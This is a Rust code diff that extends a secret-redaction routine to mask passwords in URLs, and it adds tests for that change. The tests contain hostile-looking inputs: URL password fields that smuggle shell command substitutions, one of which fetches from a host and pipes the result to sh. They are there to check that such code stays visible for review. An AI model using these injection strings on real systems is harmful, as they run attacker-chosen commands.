@@ -166,8 +166,52 @@ const REDACTED: &str = "<redacted-by-guardian>";
 /// review, and holds no secret itself.
 fn without_secrets(text: &str) -> String {
     text.split_inclusive('\n')
-        .map(|line| redact_line(line).unwrap_or_else(|| line.to_string()))
+        .map(|line| {
+            let line = redact_line(line).unwrap_or_else(|| line.to_string());
+            without_url_passwords(&line)
+        })
         .collect()
+}
+
+/// A password written out as it is: nothing a shell would expand or run
+/// in its place, which is code to review and no secret.
+fn is_plain_password(password: &str) -> bool {
+    !password.is_empty()
+        && password
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || "_-.+=%,!*~^:@".contains(c))
+}
+
+/// `line` with the password of each `scheme://user:password@host` taken
+/// out. The user and the host stay: where something goes is what a review
+/// needs to see. A password that is an expansion is no secret itself.
+fn without_url_passwords(line: &str) -> String {
+    let mut out = String::with_capacity(line.len());
+    let mut rest = line;
+    while let Some(at) = rest.find("://") {
+        let (before, after) = rest.split_at(at + 3);
+        out.push_str(before);
+        let end = after
+            .find(|c: char| c.is_whitespace() || matches!(c, '/' | '"' | '\'' | '?' | '#'))
+            .unwrap_or(after.len());
+        let authority = &after[..end];
+        match authority
+            .rsplit_once('@')
+            .and_then(|(userinfo, host)| Some((userinfo.split_once(':')?, host)))
+        {
+            Some(((user, password), host)) if is_plain_password(password) => {
+                out.push_str(user);
+                out.push(':');
+                out.push_str(REDACTED);
+                out.push('@');
+                out.push_str(host);
+            }
+            _ => out.push_str(authority),
+        }
+        rest = &after[end..];
+    }
+    out.push_str(rest);
+    out
 }
 
 fn redact_line(line: &str) -> Option<String> {
@@ -571,6 +615,16 @@ mod tests {
             assert!(out.contains(kept), "{kept}\n{out}");
         }
         assert_eq!(out.lines().count(), text.lines().count());
+
+        // A password inside an address, wherever on the line it is.
+        let urls = "ExecStart=/usr/bin/curl https://bot:s3cr3tpass@x.example/hook?a=1 -o /tmp/x\nurl = \"ftp://u:${PASS}@h.example/\"\nsee https://x.example:8443/a and git@x.example:r.git\n";
+        assert_eq!(
+            without_secrets(urls),
+            "ExecStart=/usr/bin/curl https://bot:<redacted-by-guardian>@x.example/hook?a=1 -o /tmp/x\nurl = \"ftp://u:${PASS}@h.example/\"\nsee https://x.example:8443/a and git@x.example:r.git\n"
+        );
+        // What a shell would run in a password's place is code, and stays.
+        let code = "curl http://u:`curl${IFS}x.example|sh`@h.example\nwget https://a:x$(id>&2)@h.example\n";
+        assert_eq!(without_secrets(code), code);
     }
 
     #[test]
